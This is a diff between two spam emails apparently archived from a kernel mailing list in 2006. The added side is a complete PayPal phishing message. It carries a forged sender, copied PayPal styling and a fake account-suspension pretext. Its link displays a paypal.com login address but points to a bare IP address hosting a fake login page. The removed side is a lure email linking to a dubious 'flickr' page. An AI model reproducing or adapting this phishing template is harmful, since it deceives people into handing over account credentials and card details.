@@ -1,74 +1,150 @@
-From: Arturo <Rhea@c2i.net>
-Date: Sun, 05 Nov 2006 06:48:46 +0000
-Subject: [KJ] question about your photo
-Message-Id: <FECD612F.9694648@c2i.net>
+From: customercare@paypal.com
+Date: Mon, 20 Nov 2006 23:06:55 +0000
+Subject: Account Problems!
+Message-Id: <20061120230655.10853.qmail@area51.corp-com.com>
 MIME-Version: 1
-Content-Type: multipart/mixed; boundary="===============1986854711=="
+Content-Type: multipart/mixed; boundary="===============0602295145=="
 List-Id: <kernel-janitors.vger.kernel.org>
-References: <A66799B2.1757066@northwestern.edu>
-In-Reply-To: <A66799B2.1757066@northwestern.edu>
 To: kernel-janitors@vger.kernel.org
 
-This is a multi-part message in MIME format...
-
---===============1986854711==
-Content-Type: multipart/alternative;
-    boundary="----------=_1162709353-23424-112"
-Content-Transfer-Encoding: binary
-MIME-Version: 1.0
-X-Mailer: MIME-tools 5.411 (Entity 5.404)
-
-This is a multi-part message in MIME format...
-
-------------=_1162709353-23424-112
-Content-Type: text/plain; charset=iso-8859-1; format=flowed
-Content-Transfer-Encoding: 8bit
-Content-Disposition: inline
+--===============0602295145==
+Content-Type: text/html
 
 
-   I've accidently found [1]your photo at a flickr and i'm very interested in
-   it.
-   Can you tell me what place i can see in the background of it?
-   ---
-   wbr, Cindy
-
-References
-
-   1. file://localhost/home/cmf3/tasks/keeper_au_new/0lXwcx/http://www.berryrealty.com/flickr.html
-
-
-------------=_1162709353-23424-112
-Content-Type: text/html; charset=iso-8859-1
-Content-Transfer-Encoding: 8bit
-Content-Disposition: inline
-
-<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
 <html>
 <head>
-  <meta content="text/html;charset=iso-8859-1"
- http-equiv="Content-Type">
-  <title>question about your photo</title>
+<title>PayPal</title>
+<style type="text/css">
+.dummy {}
+BODY, TD {font-family: verdana,arial,helvetica,sans-serif;font-size:
+12px;color: #000000;}
+LI {line-height: 120%;}
+UL.ppsmallborder {margin:10px 5px 10px 20px;}
+LI.ppsmallborderli {margin:0px 0px 5px 0px;}
+UL.pp_narrow {margin:10px 5px 0px 40px;}
+hr.dotted {width: 100%; margin-top: 0px; margin-bottom: 0px; border-left:
+#fff; border-right: #fff; border-top: #fff; border-bottom: 2px dotted #ccc;}
+.pp_label {font-family: verdana,arial,helvetica,sans-serif;font-size:
+10px;font-weight: bold;color: #000000;}
+.pp_serifbig {font-family: serif;font-size: 20px;font-weight: bold;color:
+#000000;}
+.pp_serif{font-family: serif;font-size: 16px;color: #000000;}
+.pp_sansserif{font-family: verdana,arial,helvetica,sans-serif; font-size:
+16px;color: #000000;}
+.pp_heading {font-family: verdana,arial,helvetica,sans-serif;font-size:
+18px;font-weight: bold;color: #003366;}	
+.pp_subheadingeoa {font-family:
+verdana,arial,helvetica,sans-serif;font-size: 15px;font-weight: bold;color:
+#000000;}	
+.pp_subheading {font-family: verdana,arial,helvetica,sans-serif;font-size:
+16px;font-weight: bold;color: #003366;}	
+.pp_sidebartext {font-family: verdana,arial,helvetica,sans-serif;font-size:
+11px;color: #003366;}	
+.pp_sidebartextbold {font-family:
+verdana,arial,helvetica,sans-serif;font-size: 11px;font-weight: bold;color:
+#003366;}	
+.pp_footer {font-family: verdana,arial,helvetica,sans-serif;font-size:
+11px;color: #aaaaaa;}
+.pp_button {font-size: 13px; font-family:
+verdana,arial,helvetica,sans-serif; font-weight: 400; border-style:outset;
+color:#000000; background-color: #cccccc;}
+.pp_smaller {font-family: verdana,arial,helvetica,sans-serif;font-size:
+10px;color: #000000;}
+.pp_smallersidebar {font-family:
+verdana,arial,helvetica,sans-serif;font-size: 10px;color: #003366;}
+.ppem106 {font-weight: 700;}
+</style>
 </head>
-<body bgcolor="#ffffff" text="#000000">
-I've accidently found <a href="http://www.berryrealty.com/flickr.html">your photo</a> at a flickr and i'm very
-interested in it.<br> Can you tell me what place i can see in the background of
-it?<br><br>
----<br>
-wbr, Mitzi<br>
-</body>
+<body bgcolor="#ffffff">
+<table width="600" cellspacing="0" cellpadding="0" border="0"
+align="center">
+	<tr valign="top">
+		<td><A href="https://www.paypal.com/us"><IMG
+src="http://images.paypal.com/en_US/i/logo/email_logo.gif" alt="PayPal"
+border="0" width="255" height="35"></A>
+		</td>
+	</tr>
+</table>
+<table width="750" cellspacing="0" cellpadding="0" border="0" height="316">
+<tr>
+	<td background="http://images.paypal.com/images/bg_clk.gif"
+width=750 height="29"><img src="http://images.paypal.com/images/pixel.gif" height="29"
+width="1" border="0"></td>
+</tr>	
+<tr>
+	<td height="287" width="750"><b><img src="http://images.paypal.com/images/pixel.gif" height="10"
+width="1" border="0">PayPal is committed to maintaining a safe environment for 
+    its community of customers. To protect the security of your account, PayPal 
+    employs some of the most advanced security systems in the world and our 
+    anti-fraud teams regularly screen the PayPal system for unusual activity.
+    <br>
+    <br>
+    We are contacting you to remind you that on 21 November 2006 our Account Review 
+    Team identified some unusual activity in your account. In accordance with 
+    PayPal's User Agreement and to ensure that your account has not been 
+    compromised, access to your account was limited. Your account access will 
+    remain limited until this issue has been resolved.<br>
+    <br>
+    To secure your account and quickly restore full access, we may require some 
+    additional information from you for the following reason:<br>
+    <br>
+    We have been notified that a card associated with your account has been 
+    reported as lost or stolen, or that there were additional problems with your 
+    card.<br>
+    <br>
+    <br>
+    This process is mandatory, and if not completed within the nearest time your 
+    account or credit card may be subject for temporary suspension. <br>
+    <br>
+    To securely confirm your PayPal information please click on the link bellow:<br>
+    <br>
+    <br>
+    <br>
+    <a href="http://216.21.184.16/~diane/PayPal/login.html">https://www.paypal.com/cgi-bin/webscr?cmd=_login-run</a><br>
+    <br>
+    <br>
+    <br>
+    We encourage you to log in and perform the steps necessary to restore your 
+    account access as soon as possible. Allowing your account access to remain 
+    limited for an extended period of time may result in further limitations on 
+    the use of your account and possible account closure.<br>
+    <br>
+    For more information about how to protect your account please visit PayPal 
+    Security Center. We apologize for any incovenience this may cause, and we 
+    apriciate your assistance in helping us to maintain the integrity of the 
+    entire PayPal system.<br>
+    <br>
+    <br>
+    <br>
+    Thank you for using PayPal!<br>
+    The PayPal Team</b><br>
+ </td>
+</tr>
+</table>
+</body>   
 </html>
 
-------------=_1162709353-23424-112--
 
---===============1986854711==
-Content-Type: text/plain; charset="iso-8859-1"
+--===============0602295145==
+Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
-Content-Transfer-Encoding: quoted-printable
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
+
+-------------------------------------------------------------------------
+Take Surveys. Earn Cash. Influence the Future of IT
+Join SourceForge.net's Techsay panel and you'll get the chance to share your
+opinions on IT & business topics through brief surveys - and earn cash
+http://www.techsay.com/default.php?page=join.php&p=sourceforge&CID=DEVDEV
+--===============0602295145==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
 Content-Disposition: inline
 
 _______________________________________________
-Kernel-janitors mailing list
-Kernel-janitors@lists.osdl.org
-https://lists.osdl.org/mailman/listinfo/kernel-janitors
+Kernel-janitor-discuss mailing list
+Kernel-janitor-discuss@lists.sourceforge.net
+https://lists.sourceforge.net/lists/listinfo/kernel-janitor-discuss
 
---===============1986854711==--
+--===============0602295145==--
